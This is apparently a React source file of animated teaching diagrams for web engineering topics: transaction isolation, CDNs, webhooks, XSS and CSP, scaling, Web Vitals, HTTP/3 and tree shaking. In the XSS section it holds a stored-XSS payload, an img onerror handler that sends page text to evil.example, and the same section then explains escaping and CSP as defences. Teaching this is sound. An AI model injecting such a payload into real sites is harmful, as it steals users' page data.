'use client'

import { StepNote, StepPlayer } from '@/app/components/step-player'
import { SequenceDiagram, type SequenceStep } from '@/app/components/sequence-diagram'
import { CodeTrace, type TraceStep } from '@/app/components/code-trace'

// ── Transactions: the lost update ──────────────────────────────────────────

const balance = (committed: string, extra?: string) => ({
  title: 'accounts.balance',
  lines: [`committed: ${committed}`, ...(extra ? [extra] : [])],
})

const isolationSteps: SequenceStep[] = [
  {
    panel: balance('100'),
    note: 'One account, balance 100. Transaction A deposits 50; transaction B withdraws 30, at the same moment. The right final balance is 120. This runs at READ COMMITTED, the default in PostgreSQL.',
  },
  {
    message: { from: 0, to: 1, label: 'BEGIN · SELECT balance → 100' },
    panel: balance('100'),
    note: 'A reads the balance: 100.',
  },
  {
    message: { from: 2, to: 1, label: 'BEGIN · SELECT balance → 100' },
    panel: balance('100'),
    note: 'B reads it too, before A has written anything: also 100.',
  },
  {
    message: { from: 0, to: 1, label: 'UPDATE balance = 150' },
    panel: balance('100', "A's uncommitted write: 150"),
    note: 'A computes 100 + 50 in application code and writes 150. It has not committed yet.',
  },
  {
    message: { from: 1, to: 2, label: 'SELECT again → still 100', dashed: true, tone: 'ok' },
    panel: balance('100', "A's uncommitted write: 150"),
    note: 'If B reads now, it still sees 100. Uncommitted changes are invisible to other transactions — no dirty reads. That is what READ COMMITTED guarantees, and all it guarantees.',
  },
  {
    message: { from: 0, to: 1, label: 'COMMIT' },
    panel: balance('150'),
    note: 'A commits. The balance is 150.',
  },
  {
    message: { from: 2, to: 1, label: 'UPDATE balance = 70  (100 − 30)' },
    panel: balance('150', "B's write: 70, computed from the stale 100"),
    note: 'B still believes the balance is 100, so it writes 100 − 30 = 70. Nothing stops it: READ COMMITTED does not check that what B read is still current.',
  },
  {
    message: { from: 2, to: 1, label: 'COMMIT → balance 70', tone: 'bad' },
    panel: balance('70  ✗ should be 120'),
    note: 'A lost update: A\'s deposit has silently vanished. No error, no deadlock — just wrong money. The bug lives in the read-then-write gap.',
  },
  {
    message: { from: 2, to: 1, label: 'fix: UPDATE balance = balance − 30', tone: 'ok' },
    panel: balance('120  ✓', 'the database does the arithmetic on the current row'),
    note: 'The fix: let the database do the read-modify-write in one statement, which locks the row. Alternatives: SELECT … FOR UPDATE to lock before reading, or a stricter isolation level that rejects B\'s write and makes it retry.',
  },
]

export function IsolationVisualizer() {
  return <SequenceDiagram actors={['txn A', 'database', 'txn B']} steps={isolationSteps} />
}

// ── CDN ───────────────────────────────────────────────────────────────────

const edge = (lines: string[]) => ({ title: 'edge cache · Mumbai', lines })

const cdnSteps: SequenceStep[] = [
  {
    panel: edge(['(empty)']),
    note: 'The site\'s server — the origin — is in Virginia. A user in Mumbai is about 200 ms of round trip away from it. A CDN puts servers ("edges") close to users and keeps copies there.',
  },
  {
    message: { from: 0, to: 1, label: 'GET /app.3f9a.js' },
    panel: edge(['(empty)']),
    note: 'DNS sends the user to the nearest edge, in Mumbai — a few milliseconds away.',
  },
  {
    message: { from: 1, to: 2, label: 'miss → GET /app.3f9a.js' },
    panel: edge(['(empty)']),
    note: 'The edge doesn\'t have the file yet — a cache miss — so it fetches it from the origin across the world.',
  },
  {
    message: { from: 2, to: 1, label: '200 · Cache-Control: max-age=31536000, immutable', dashed: true },
    panel: edge(['/app.3f9a.js   cached for 1 year']),
    note: 'The origin\'s Cache-Control header tells the edge it may keep the file. This first request was slow: about 250 ms.',
  },
  {
    message: { from: 1, to: 0, label: 'app.3f9a.js  (~250 ms)', dashed: true },
    panel: edge(['/app.3f9a.js   cached for 1 year']),
    note: 'Only the very first user near this edge pays that price.',
  },
  {
    message: { from: 0, to: 1, label: 'next user: GET /app.3f9a.js' },
    panel: edge(['/app.3f9a.js   cached · hit']),
    note: 'Every later request from the region…',
  },
  {
    message: { from: 1, to: 0, label: 'hit  (~15 ms)', dashed: true, tone: 'ok' },
    panel: edge(['/app.3f9a.js   cached · hit']),
    note: '…is answered by the edge itself, about 15 times faster, and never touches the origin. With hundreds of edges, the origin serves a tiny fraction of the traffic.',
  },
  {
    message: { from: 0, to: 1, label: 'GET /api/cart  (personal)' },
    panel: edge(['/app.3f9a.js   cached', '/api/cart      not cacheable — private']),
    note: 'Personal or fast-changing responses are marked private or no-store, so the edge passes them through. CDNs still help here: TLS ends nearby, and the edge keeps a warm connection to the origin.',
  },
  {
    message: { from: 1, to: 2, label: 'pass through', tone: 'warn' },
    panel: edge(['/app.3f9a.js   cached', '/api/cart      not cacheable — private']),
    note: 'Rule of thumb: cache static, versioned files for a long time; give HTML a short lifetime or revalidate it; never cache anything personal at the edge.',
  },
]

export function CdnVisualizer() {
  return <SequenceDiagram actors={['user · Mumbai', 'CDN edge', 'origin · Virginia']} steps={cdnSteps} />
}

// ── Webhooks ────────────────────────────────────────────────────────────────

const processed = (ids: string[]) => ({ title: 'processed event ids', lines: ids.length ? ids : ['(none)'] })

const webhookSteps: SequenceStep[] = [
  {
    panel: processed([]),
    note: 'A webhook is the provider calling you: when something happens on their side — a payment succeeds — they send an HTTP POST to a URL you registered.',
  },
  {
    message: { from: 0, to: 1, label: 'POST /webhooks  evt_81 payment.succeeded' },
    panel: processed([]),
    note: 'The request carries the event as JSON, plus a signature header: an HMAC of the raw body and a timestamp, made with a secret only you and the provider know.',
  },
  {
    message: { from: 1, to: 1, label: 'verify signature + timestamp', tone: 'ok' },
    panel: processed([]),
    note: 'Anyone can POST to your URL, so first recompute the HMAC over the exact raw body and compare. Reject old timestamps too, so a captured request can\'t be replayed later.',
  },
  {
    message: { from: 1, to: 2, label: 'enqueue evt_81' },
    panel: processed([]),
    note: 'Don\'t do the real work inside the request. Put the event on a queue…',
  },
  {
    message: { from: 1, to: 0, label: '200 OK  (in ~50 ms)', dashed: true, tone: 'ok' },
    panel: processed(['evt_81']),
    note: '…and answer 200 quickly. Providers wait only a few seconds; a slow endpoint looks like a failure and gets retried.',
  },
  {
    message: { from: 0, to: 1, label: 'POST evt_82 · times out' },
    panel: processed(['evt_81']),
    note: 'Suppose the next delivery times out — your server was deploying. The provider can\'t tell whether you processed it.',
  },
  {
    message: { from: 0, to: 1, label: 'retry evt_82 (after backoff)' },
    panel: processed(['evt_81']),
    note: 'So it retries, with increasing delays, for hours or days. Delivery is at-least-once: you will see duplicates.',
  },
  {
    message: { from: 1, to: 2, label: 'evt_82 seen before? no → enqueue' },
    panel: processed(['evt_81', 'evt_82']),
    note: 'Record each event id as you process it, in the same transaction as the side effect. A second delivery of evt_82 is then recognised and acknowledged without running twice.',
  },
  {
    message: { from: 1, to: 0, label: '200 OK', dashed: true, tone: 'ok' },
    panel: processed(['evt_81', 'evt_82']),
    note: 'Verify, acknowledge fast, process async, deduplicate by id — and don\'t assume events arrive in order; check the current state with the provider\'s API when order matters.',
  },
]

export function WebhookVisualizer() {
  return <SequenceDiagram actors={['provider', 'your endpoint', 'job queue']} steps={webhookSteps} />
}

// ── XSS and CSP ─────────────────────────────────────────────────────────────

const PAYLOAD = '<img src=x onerror="fetch(\'//evil.example?d=\'+document.body.innerText)">'

const xssSteps: SequenceStep[] = [
  {
    note: 'Cross-site scripting (XSS) is getting your own site to run someone else\'s JavaScript — in your users\' browsers, with your site\'s full access to the page.',
  },
  {
    message: { from: 0, to: 1, label: 'POST a comment containing HTML' },
    panel: { title: 'comment text', lines: [PAYLOAD] },
    note: 'An attacker submits a comment that isn\'t just text — it\'s an HTML tag with a JavaScript event handler.',
  },
  {
    message: { from: 1, to: 1, label: 'store as-is', tone: 'warn' },
    panel: { title: 'comment text', lines: [PAYLOAD] },
    note: 'The site saves it unchanged. Storing it isn\'t the bug; what happens next is.',
  },
  {
    message: { from: 2, to: 1, label: 'GET /post/42' },
    panel: { title: 'comment text', lines: [PAYLOAD] },
    note: 'Later, a normal user opens the post.',
  },
  {
    message: { from: 1, to: 2, label: 'HTML with the comment pasted in raw', dashed: true, tone: 'bad' },
    panel: { title: 'page HTML', lines: ['<div class="comment">', `  ${PAYLOAD}`, '</div>'] },
    note: 'The server builds the page by inserting the comment straight into the HTML. The browser can\'t tell the attacker\'s markup from the site\'s own.',
  },
  {
    message: { from: 2, to: 0, label: 'image fails → onerror runs → page data sent to attacker', tone: 'bad' },
    panel: { title: 'page HTML', lines: ['<div class="comment">', `  ${PAYLOAD}`, '</div>'] },
    note: 'The image fails to load, the handler fires, and the script sends whatever the page shows to the attacker. It could equally make requests as the logged-in user.',
  },
  {
    message: { from: 1, to: 2, label: 'fix 1: escape on output', dashed: true, tone: 'ok' },
    panel: { title: 'page HTML', lines: ['<div class="comment">', '  &lt;img src=x onerror=…&gt;', '</div>'] },
    note: 'Escape user content for the context it lands in: < becomes &lt;, so the comment is displayed as text instead of parsed as markup. Frameworks like React do this by default — until you use dangerouslySetInnerHTML.',
  },
  {
    message: { from: 2, to: 2, label: 'fix 2: CSP blocks inline script', tone: 'ok' },
    panel: { title: 'response header', lines: ["Content-Security-Policy: script-src 'self'", 'Refused to execute inline event handler…'] },
    note: 'A Content Security Policy is the safety net: it tells the browser which scripts may run. With script-src \'self\', inline handlers and injected scripts are refused even if escaping was missed somewhere.',
  },
]

export function XssVisualizer() {
  return <SequenceDiagram actors={['attacker', 'site.example', "victim's browser"]} steps={xssSteps} />
}

// ── Vertical vs horizontal scaling ─────────────────────────────────────────

type ScaleStep = {
  title: string
  servers: { label: string; capacity: number; down?: boolean }[]
  load: number // requests per second
  balancer?: boolean
  sharedState?: boolean
  note: string
}

const scaleSteps: ScaleStep[] = [
  {
    title: 'one small server',
    servers: [{ label: '2 vCPU', capacity: 1000 }],
    load: 600,
    note: 'One server handles 1,000 requests per second; traffic is 600. Comfortable.',
  },
  {
    title: 'traffic grows',
    servers: [{ label: '2 vCPU', capacity: 1000 }],
    load: 1400,
    note: 'Traffic grows to 1,400 rps. The server is over capacity: responses slow down, then time out.',
  },
  {
    title: 'scale up (vertical)',
    servers: [{ label: '8 vCPU', capacity: 4000 }],
    load: 1400,
    note: 'Scaling up: move to a bigger machine. No code changes at all — which is why it\'s the right first move. But machine sizes have a ceiling, the price per unit of capacity rises at the top end, and it\'s still one machine.',
  },
  {
    title: 'the single point of failure',
    servers: [{ label: '8 vCPU', capacity: 4000, down: true }],
    load: 1400,
    note: 'When that one machine fails or restarts for a deploy, the whole site is down, however big it is.',
  },
  {
    title: 'scale out (horizontal)',
    servers: [
      { label: '2 vCPU', capacity: 1000 },
      { label: '2 vCPU', capacity: 1000 },
      { label: '2 vCPU', capacity: 1000 },
    ],
    load: 1400,
    balancer: true,
    note: 'Scaling out: several smaller machines behind a load balancer, which spreads requests across them. Need more capacity? Add a machine — while the site stays up.',
  },
  {
    title: 'one fails — the rest carry on',
    servers: [
      { label: '2 vCPU', capacity: 1000 },
      { label: '2 vCPU', capacity: 1000, down: true },
      { label: '2 vCPU', capacity: 1000 },
    ],
    load: 1400,
    balancer: true,
    note: 'A server dies and the load balancer stops sending it traffic. The other two absorb it. Failure becomes reduced capacity instead of an outage.',
  },
  {
    title: 'the catch: stateless servers',
    servers: [
      { label: '2 vCPU', capacity: 1000 },
      { label: '2 vCPU', capacity: 1000 },
      { label: '2 vCPU', capacity: 1000 },
    ],
    load: 1400,
    balancer: true,
    sharedState: true,
    note: 'Any request can land on any server, so none of them may keep sessions or uploads in local memory or disk. State moves to shared services — a database, Redis, object storage. That redesign is the real cost of scaling out.',
  },
]

export function ScalingVisualizer() {
  return (
    <StepPlayer length={scaleSteps.length} interval={3000}>
      {(index) => {
        const step = scaleSteps[index]
        const up = step.servers.filter((s) => !s.down)
        const capacity = up.reduce((sum, s) => sum + s.capacity, 0)
        const util = capacity === 0 ? Infinity : step.load / capacity
        const status = !Number.isFinite(util) ? 'down' : util > 1 ? 'overloaded' : 'ok'
        return (
          <>
            <div className="mb-3 flex items-center justify-between font-mono text-[10px]">
              <span className="text-neutral-700 dark:text-neutral-200">{step.title}</span>
              <span className="text-neutral-400 dark:text-neutral-500">{step.load.toLocaleString('en-US')} req/s</span>
            </div>
            {step.balancer ? (
              <div className="mx-auto mb-2 w-32 rounded-md bg-neutral-100 dark:bg-neutral-800 py-1 text-center font-mono text-[10px] text-neutral-600 dark:text-neutral-300">
                load balancer
              </div>
            ) : null}
            <div className="flex justify-center gap-2">
              {step.servers.map((s, i) => {
                const share = s.down || up.length === 0 ? 0 : step.load / up.length
                const pct = Math.min(share / s.capacity, 1)
                const over = share > s.capacity
                return (
                  <div
                    key={i}
                    className={[
                      'flex flex-col items-center rounded-lg border p-2 font-mono text-[10px] transition-all duration-500',
                      s.down
                        ? 'border-dashed border-red-500 text-red-500'
                        : 'border-neutral-200 dark:border-neutral-700 text-neutral-700 dark:text-neutral-200',
                      s.capacity >= 4000 ? 'w-36' : 'w-20',
                    ].join(' ')}
                  >
                    <span>{s.down ? 'down' : s.label}</span>
                    <div className="mt-1.5 h-2 w-full overflow-hidden rounded bg-neutral-100 dark:bg-neutral-800">
                      <div
                        className={[
                          'h-full transition-[width] duration-500',
                          over ? 'bg-red-500' : 'bg-green-600 dark:bg-green-500',
                        ].join(' ')}
                        style={{ width: `${pct * 100}%` }}
                      />
                    </div>
                    <span className="mt-1 text-neutral-400 dark:text-neutral-500">
                      {s.down ? '—' : `${Math.round(share).toLocaleString('en-US')}/${s.capacity.toLocaleString('en-US')}`}
                    </span>
                  </div>
                )
              })}
            </div>
            {step.sharedState ? (
              <div className="mx-auto mt-2 w-48 rounded-md border border-amber-500/60 bg-amber-500/10 py-1 text-center font-mono text-[10px] text-amber-700 dark:text-amber-300">
                shared state: DB · Redis · storage
              </div>
            ) : null}
            <div
              className={[
                'mt-3 text-center font-mono text-[10px]',
                status === 'ok' ? 'text-green-700 dark:text-green-400' : 'text-red-500',
              ].join(' ')}
            >
              {status === 'down'
                ? 'site down'
                : status === 'overloaded'
                  ? `overloaded — ${Math.round(util * 100)}% of capacity`
                  : `${Math.round(util * 100)}% of capacity in use`}
            </div>
            <StepNote>{step.note}</StepNote>
          </>
        )
      }}
    </StepPlayer>
  )
}

// ── Core Web Vitals ────────────────────────────────────────────────────────

type Block = { id: string; label: string; h: number; tone?: 'lcp' | 'shift' }

type VitalsStep = {
  time: string
  blocks: Block[]
  shifted?: boolean
  metrics: { lcp?: number; cls?: number; inp?: number }
  note: string
}

const HEADER: Block = { id: 'h', label: 'header', h: 14 }
const TEXT: Block = { id: 't', label: 'headline + text', h: 22 }
const HERO: Block = { id: 'img', label: 'hero image', h: 46, tone: 'lcp' }
const BANNER: Block = { id: 'b', label: 'cookie banner (injected)', h: 18, tone: 'shift' }
const BUTTON: Block = { id: 'btn', label: '[ Add to cart ]', h: 12 }

const vitalsSteps: VitalsStep[] = [
  {
    time: '0.4 s',
    blocks: [HEADER],
    metrics: {},
    note: 'Core Web Vitals are three numbers Google uses to measure how a page feels to a real user: how fast the main content appears, how stable the layout is, and how quickly the page responds.',
  },
  {
    time: '1.1 s',
    blocks: [HEADER, TEXT, BUTTON],
    metrics: {},
    note: 'Text and a button appear. The page is not finished — the biggest element, the hero image, is still loading.',
  },
  {
    time: '2.9 s',
    blocks: [HEADER, TEXT, HERO, BUTTON],
    metrics: { lcp: 2.9 },
    note: 'Largest Contentful Paint (LCP): when the largest image or text block finishes rendering. Here 2.9 s — just over the 2.5 s "good" threshold. Usual fixes: preload the hero image, serve it smaller, avoid render-blocking CSS and JS.',
  },
  {
    time: '3.2 s',
    blocks: [HEADER, BANNER, TEXT, HERO, BUTTON],
    shifted: true,
    metrics: { lcp: 2.9, cls: 0.24 },
    note: 'A banner is injected at the top and pushes everything down while the user is reading. Cumulative Layout Shift (CLS) scores how much visible content moved: 0.24, well past the 0.1 limit. Fix: reserve space for late content (and set image dimensions).',
  },
  {
    time: '5.0 s',
    blocks: [HEADER, BANNER, TEXT, HERO, BUTTON],
    metrics: { lcp: 2.9, cls: 0.24, inp: 480 },
    note: 'The user taps Add to cart. A 450 ms JavaScript task is running, so the tap waits, and the next frame paints 480 ms later. Interaction to Next Paint (INP) is that delay; good is under 200 ms. Fix: break up long tasks and do less work on the main thread.',
  },
]

type Rating = 'good' | 'needs work' | 'poor'
const rate = (v: number | undefined, good: number, poor: number): Rating | undefined =>
  v === undefined ? undefined : v <= good ? 'good' : v <= poor ? 'needs work' : 'poor'
const RATING_STYLE: Record<Rating, string> = {
  good: 'text-green-700 dark:text-green-400',
  'needs work': 'text-amber-600 dark:text-amber-400',
  poor: 'text-red-500',
}

export function WebVitalsVisualizer() {
  return (
    <StepPlayer length={vitalsSteps.length} interval={3200}>
      {(index) => {
        const step = vitalsSteps[index]
        const metrics: { name: string; value: string; rating?: Rating }[] = [
          { name: 'LCP', value: step.metrics.lcp ? `${step.metrics.lcp} s` : '—', rating: rate(step.metrics.lcp, 2.5, 4) },
          { name: 'CLS', value: step.metrics.cls !== undefined ? String(step.metrics.cls) : '—', rating: rate(step.metrics.cls, 0.1, 0.25) },
          { name: 'INP', value: step.metrics.inp ? `${step.metrics.inp} ms` : '—', rating: rate(step.metrics.inp, 200, 500) },
        ]
        return (
          <>
            <div className="flex gap-3">
              <div className="w-32 shrink-0 rounded-xl border-2 border-neutral-200 dark:border-neutral-700 p-1.5">
                <div className="mb-1 text-center font-mono text-[9px] text-neutral-400 dark:text-neutral-500">
                  t = {step.time}
                </div>
                <div className="flex min-h-40 flex-col gap-1">
                  {step.blocks.map((b) => (
                    <div
                      key={b.id}
                      className={[
                        'flex items-center justify-center rounded px-1 text-center font-mono text-[8.5px] leading-tight transition-all duration-500',
                        b.tone === 'lcp'
                          ? 'bg-green-600/20 text-green-800 dark:text-green-300 ring-1 ring-green-600'
                          : b.tone === 'shift'
                            ? 'bg-red-500/15 text-red-600 dark:text-red-400 ring-1 ring-red-500'
                            : 'bg-neutral-100 dark:bg-neutral-800 text-neutral-500 dark:text-neutral-400',
                      ].join(' ')}
                      style={{ height: `${b.h}px` }}
                    >
                      {b.label}
                    </div>
                  ))}
                </div>
              </div>
              <div className="flex-1 space-y-1.5 font-mono text-[10px]">
                {metrics.map((m) => (
                  <div key={m.name} className="rounded-lg border border-neutral-100 dark:border-neutral-800 px-2 py-1.5">
                    <div className="flex justify-between">
                      <span className="text-neutral-500 dark:text-neutral-400">{m.name}</span>
                      <span className="text-neutral-800 dark:text-neutral-100">{m.value}</span>
                    </div>
                    <div className={['text-right', m.rating ? RATING_STYLE[m.rating] : 'text-neutral-300 dark:text-neutral-600'].join(' ')}>
                      {m.rating ?? 'not yet'}
                    </div>
                  </div>
                ))}
                {step.shifted ? (
                  <div className="text-center text-red-500">↓ content pushed down</div>
                ) : null}
              </div>
            </div>
            <StepNote>{step.note}</StepNote>
          </>
        )
      }}
    </StepPlayer>
  )
}

// ── HTTP/2 vs HTTP/3: head-of-line blocking ─────────────────────────────────

type PacketState = 'pending' | 'arrived' | 'lost' | 'waiting' | 'delivered'
type Packet = { stream: 'html' | 'css' | 'js'; n: number }

// Interleaved the way multiplexed streams share one connection.
const PACKETS: Packet[] = [
  { stream: 'html', n: 1 },
  { stream: 'css', n: 1 },
  { stream: 'js', n: 1 },
  { stream: 'html', n: 2 },
  { stream: 'css', n: 2 },
  { stream: 'js', n: 2 },
]
type HolStep = { h2: PacketState[]; h3: PacketState[]; note: string }

const all = (s: PacketState) => PACKETS.map(() => s)

const holSteps: HolStep[] = [
  {
    h2: all('pending'),
    h3: all('pending'),
    note: 'Three files — HTML, CSS, JS — are downloading at once over one connection, their packets interleaved. Both HTTP/2 and HTTP/3 multiplex streams like this. The difference is what happens when one packet is lost.',
  },
  {
    h2: ['arrived', 'lost', 'arrived', 'arrived', 'arrived', 'arrived'],
    h3: ['arrived', 'lost', 'arrived', 'arrived', 'arrived', 'arrived'],
    note: 'One packet — CSS #1 — is lost on the network. Everything else arrives.',
  },
  {
    h2: ['delivered', 'lost', 'waiting', 'waiting', 'waiting', 'waiting'],
    h3: ['delivered', 'lost', 'delivered', 'delivered', 'waiting', 'delivered'],
    note: 'HTTP/2 runs over TCP, which promises one in-order byte stream. Nothing after the gap can be handed over — not even HTML and JS, which don\'t need the missing packet. That is head-of-line blocking. HTTP/3 runs over QUIC, which orders each stream separately: only CSS waits.',
  },
  {
    h2: all('delivered'),
    h3: all('delivered'),
    note: 'The lost packet is retransmitted, a round trip later, and HTTP/2 finally releases everything. On a lossy mobile network that stall repeats often — which is where HTTP/3 helps most.',
  },
]

const PACKET_STYLE: Record<PacketState, string> = {
  pending: 'bg-neutral-100 dark:bg-neutral-800 text-neutral-400 dark:text-neutral-500',
  arrived: 'bg-neutral-300 dark:bg-neutral-600 text-neutral-800 dark:text-neutral-100',
  lost: 'bg-red-500 text-white',
  waiting: 'bg-amber-500/25 text-amber-700 dark:text-amber-300',
  delivered: 'bg-green-600 dark:bg-green-500 text-white',
}

function PacketRow({ title, states }: { title: string; states: PacketState[] }) {
  return (
    <div>
      <div className="mb-1 font-mono text-[9.5px] uppercase tracking-wide text-neutral-400 dark:text-neutral-500">{title}</div>
      <div className="grid grid-cols-6 gap-1">
        {PACKETS.map((p, i) => (
          <div
            key={i}
            className={['rounded-md py-1.5 text-center font-mono text-[10px] transition-colors duration-300', PACKET_STYLE[states[i]]].join(' ')}
          >
            {p.stream} {p.n}
            <div className="text-[8.5px] opacity-80">{states[i]}</div>
          </div>
        ))}
      </div>
    </div>
  )
}

export function HeadOfLineVisualizer() {
  return (
    <StepPlayer length={holSteps.length} interval={3200}>
      {(index) => {
        const step = holSteps[index]
        return (
          <>
            <div className="space-y-3">
              <PacketRow title="HTTP/2 over TCP — one ordered stream" states={step.h2} />
              <PacketRow title="HTTP/3 over QUIC — each stream ordered on its own" states={step.h3} />
            </div>
            <StepNote>{step.note}</StepNote>
          </>
        )
      }}
    </StepPlayer>
  )
}

// ── Tree shaking ───────────────────────────────────────────────────────────

const SHAKE_CODE = [
  '// utils.js',
  'export function add(a, b) { return a + b }',
  'export function multiply(a, b) { return a * b }',
  "export { format } from 'big-date-lib'   // 70 KB",
  '',
  '// app.js',
  "import { add } from './utils.js'",
  'console.log(add(2, 3))',
]

const bundle = (rows: [string, string, ('ok' | 'warn' | 'bad' | 'muted')?][]) => ({
  title: 'bundle',
  rows: rows.map(([k, v, tone]) => ({ k, v, tone })),
})

const shakeSteps: TraceStep[] = [
  {
    lines: [0, 1, 2, 3],
    panels: [bundle([['utils.js exports', 'add, multiply, format']])],
    note: 'utils.js exports three things, one of which pulls in a large date library. Without tree shaking, importing anything from it ships all of it.',
  },
  {
    lines: [6],
    panels: [bundle([['app.js uses', 'add']])],
    note: 'app.js imports only add. Because ES module imports and exports are static — written at the top level, with fixed names — a bundler can see exactly which exports are used without running any code.',
  },
  {
    lines: [1, 2, 3],
    panels: [
      bundle([
        ['add', 'used → keep', 'ok'],
        ['multiply', 'unused → drop', 'muted'],
        ['format + big-date-lib', 'unused → drop', 'muted'],
      ]),
    ],
    note: 'The bundler marks what is reachable from the entry point and drops the rest. multiply and the whole date library never reach the browser. This is tree shaking: dead branches fall off the dependency tree.',
  },
  {
    lines: [6, 7],
    panels: [bundle([['before', '~71 KB'], ['after', '< 1 KB', 'ok']])],
    note: 'Shipping less JavaScript means less to download, parse and run — directly improving load time on slow phones.',
  },
  {
    lines: [],
    panels: [
      bundle([
        ["require('./utils')", 'can\'t shake — dynamic', 'bad'],
        ["import * as u; u[name]", 'can\'t tell what\'s used', 'warn'],
        ['module with side effects', 'kept unless sideEffects: false', 'warn'],
      ]),
    ],
    note: 'What stops it: CommonJS require (resolved at runtime), dynamic property access on a namespace import, and modules that might have side effects when loaded. Libraries declare "sideEffects": false in package.json to promise they are safe to drop.',
  },
]

export function TreeShakingVisualizer() {
  return <CodeTrace code={SHAKE_CODE} steps={shakeSteps} interval={3000} />
}
